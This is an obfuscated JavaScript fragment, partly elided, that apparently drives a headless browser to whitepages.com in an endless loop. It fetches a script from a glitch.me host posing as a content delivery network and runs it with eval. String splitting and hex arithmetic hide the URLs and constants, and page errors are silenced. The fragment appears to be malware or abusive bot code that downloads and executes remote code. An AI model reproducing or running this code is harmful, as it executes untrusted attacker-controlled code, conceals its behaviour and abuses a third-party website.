((async () => {
  ...
  (async function g() {
    let h = 0x2098 + -0x5 * 0x1e3 + 0x7 * -0x34f;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x305 + -0x1 * -0xc17 + -0x912), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x117290 + -0x1a30d8 + 0x1679e8), await j['close'](), await i['close'](), g());
  }());
})());